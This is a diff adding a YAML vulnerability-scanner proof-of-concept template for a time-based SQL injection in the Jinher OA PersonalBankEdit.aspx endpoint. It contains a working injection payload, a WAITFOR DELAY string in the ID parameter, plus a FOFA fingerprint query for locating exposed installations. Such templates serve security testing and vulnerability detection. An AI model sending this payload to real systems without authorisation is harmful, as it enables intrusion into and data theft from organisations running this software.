@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-jhsoft-personalbankedit-aspx-sqli
+info:
+  name: 金和OA PersonalBankEdit.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.CostControl/PersonalBankEdit.aspx/?ID=1'waitfor+delay%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(body,"JHSoft") &&
+
+    contains(gbk_decode(body),"修改银行帐户") &&
+
+    contains(gbk_decode(body),"开户行") &&
+
+    contains(gbk_decode(body),"请输入开户帐号") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
